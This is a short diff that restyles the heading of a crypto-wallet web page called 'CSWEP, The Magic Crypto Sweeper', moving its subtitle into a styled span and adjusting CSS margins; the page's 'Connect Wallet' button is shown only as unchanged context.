@@ -9,8 +9,9 @@
     body { background: #0e0e0e; color: white; font-family: 'Segoe UI', sans-serif; margin:0; padding:0; text-align:center; }
     .main { padding:20px; max-width:600px; margin:auto; }
     .logo { max-width:100px; display:block; margin:10px auto 20px; }
-    h1 { font-size: 1.2rem; font-weight: normal; margin: 20px 0 10px 0; }
-    h2 { margin: 0 0 20px 0; font-size: 1.2rem; }
+    h1 { font-size: 1.2rem; font-weight: normal; margin: 20px 0 0 0; }
+    h1 .subtitle { display: block; font-size: 2rem; font-weight: bold; margin-top: 5px; }
+    h2 { margin: 10px 0 20px 0; font-size: 1.2rem; }
     button { padding:10px 20px; margin:10px; background:#0a65ff; color:white; border:none; border-radius:8px; cursor:pointer; font-weight:bold; }
     button:hover {background:#084dc1;}
     table { width:100%; margin-top:20px; border-collapse:collapse; background:#111; border-radius:10px; overflow:hidden; }
@@ -23,7 +24,7 @@
 </head>
 <body>
   <div class="main">
-    <h1><i>CSWEP</i> (BETA)<br>The Magic Crypto Sweeper</h1>
+    <h1><i>CSWEP</i> (BETA)<span class="subtitle">The Magic Crypto Sweeper</span></h1>
     <img src="cswep.logo.png" alt="CSWEP Logo" class="logo">
     <h2>Free stuck crypto. Convert to cash. No gas!</h2>
     <button onclick="connectWallet()" id="connectBtn">Connect Wallet</button>
